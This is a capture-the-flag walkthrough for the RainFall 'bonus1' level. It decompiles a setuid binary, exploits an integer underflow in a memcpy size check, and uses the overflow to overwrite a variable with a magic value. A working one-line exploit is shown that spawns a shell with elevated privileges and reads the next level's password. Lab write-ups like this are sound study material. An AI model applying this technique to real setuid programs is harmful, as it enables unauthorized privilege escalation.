# Bonus1 Walkthrough

## Who am I?

```bash
bonus1@RainFall:~$ id
uid=2011(bonus1) gid=2011(bonus1) groups=2011(bonus1),100(users)
```

## Where am I?

```bash
bonus1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
# note: the `s` bits indicate setuid/setgid, the binary runs with the owner's privileges (here `bonus2`) when executed by another user (here `bonus1`).
```

---

## Discovery, behavior test

```bash
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)

bonus1@RainFall:~$ ./bonus1 5
Segmentation fault (core dumped)

bonus1@RainFall:~$ ./bonus1 5 hello
bonus1@RainFall:~$
```

**Observation**: The program requires two arguments and doesn't produce visible output in normal execution.

---

## Function analysis

```c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    char buffer[40];
    int count;
    
    count = atoi(argv[1]);
    
    if (count < 10) {
        memcpy(buffer, argv[2], count * 4);
        
        if (count == 0x574f4c46) {
            execl("/bin/sh", "sh", NULL);
        }
        
        return 0;
    }
    else {
        return 1;
    }
}
```

### Vulnerability Analysis

* `count = atoi(argv[1])`:
  * Converts the first argument to a signed integer.
  * **Critical**: atoi returns a signed int, which can be negative.

* `if (count < 10)`:
  * Checks if count is less than 10.
  * **Implication**: Negative values will pass this check.

* `memcpy(buffer, argv[2], count * 4)`:
  * Copies `count * 4` bytes from argv[2] into a 40-byte buffer.
  * **Issue**: The third parameter is `size_t` (unsigned), so negative values will be interpreted as very large unsigned integers.
  * **Vulnerability**: Integer underflow leading to buffer overflow.

* `if (count == 0x574f4c46)`:
  * Magic number check (ASCII "FLOW" in little-endian).
  * **Goal**: We need to overwrite `count` with this value to spawn a shell.

### Stack Layout

```
Low addresses
    |
    v
[buffer - 40 bytes] [count - 4 bytes] [saved ebp] [return address]
    ^
    |
High addresses
```

**Conclusion**: We need to write 44 bytes total (40 bytes padding + 4 bytes to overwrite `count`) while bypassing the `count < 10` check.

---

## Build the exploit

### 1) Understanding Integer Underflow

When we multiply a negative signed integer by 4, the result can overflow the 32-bit boundary. The key is that `memcpy` interprets this as an unsigned `size_t`.

We need:
* `count < 10` (signed comparison) → negative values work
* `count * 4 = 44` (as unsigned after overflow) → to overwrite exactly up to and including `count`

### 2) Finding the Magic Number

We can use a simple C program to find a negative value that, when multiplied by 4, gives us 44 bytes:

```c
#include <stdio.h>

int main()
{
    long i = 0;
    for (;;)
    {
        if ((int)i * 4 == 44)
        {
            printf("i=%ld i*4=%d\n", i, (int)i * 4);
            return 0;
        }
        i--;
    }
}
```

Running this program:
```bash
$ gcc underflowfinder.c && ./a.out
i=-1073741813 i*4=44
```

**Result**: `count = -1073741813`

### 3) Verification of the Math

```
-1073741813 (decimal) = 0xC000000B (hex, as 32-bit signed int)
-1073741813 * 4 = -4294967252 (as signed 64-bit)

But in 32-bit arithmetic:
0xC000000B * 4 = 0x00000002C (keeping only lower 32 bits)
                = 44 (decimal)
```

### 4) Building the Payload

We need:
* **First argument**: `-1073741813` (to pass `count < 10` and get `memcpy` size of 44)
* **Second argument**: 
  * 40 bytes of padding (to fill the buffer)
  * 4 bytes containing `0x574f4c46` (little-endian: `\x46\x4c\x4f\x57`)

### 5) Final Exploit

```bash
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

---

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C source)
* `underflowfinder.c`: helper program to find the correct negative value

---

## Conclusion

This binary is exploitable through an integer underflow vulnerability. By providing a negative number that passes the `count < 10` check, we can trigger a buffer overflow in `memcpy` because the size parameter is cast to unsigned. The overflow allows us to overwrite the `count` variable with the magic value `0x574f4c46`, which spawns a shell with bonus2 privileges.
